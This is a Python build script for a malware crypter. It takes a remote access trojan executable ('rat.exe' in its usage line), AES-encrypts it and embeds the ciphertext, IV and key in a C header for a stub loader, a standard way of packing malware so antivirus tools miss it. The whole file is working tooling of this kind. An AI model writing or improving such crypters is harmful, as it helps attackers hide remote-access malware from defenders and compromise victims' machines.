#!/usr/bin/env python3
import os
import sys
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

def encrypt_file(input_file, output_stub):
    with open(input_file, 'rb') as f:
        data = f.read()
    
    key = generate_key().encode()
    cipher = AES.new(key, AES.MODE_CBC)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    
    # Write stub with encrypted payload
    with open('src/crypter/stub_data.h', 'w') as f:
        f.write('#ifndef STUB_DATA_H\n')
        f.write('#define STUB_DATA_H\n\n')
        f.write('static const BYTE encrypted_payload[] = {\n')
        for i, b in enumerate(encrypted + cipher.iv):
            if i % 16 == 0:
                f.write('    ')
            f.write(f'0x{b:02X}, ')
            if i % 16 == 15:
                f.write('\n')
        f.write('};\n\n')
        f.write(f'static const DWORD payload_size = {len(encrypted) + len(cipher.iv)};\n')
        f.write(f'static const char encryption_key[] = "{key}";\n\n')
        f.write('#endif // STUB_DATA_H\n')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: build_crypted.py <rat.exe>")
        sys.exit(1)
    encrypt_file(sys.argv[1], 'src/crypter/stub.cpp')
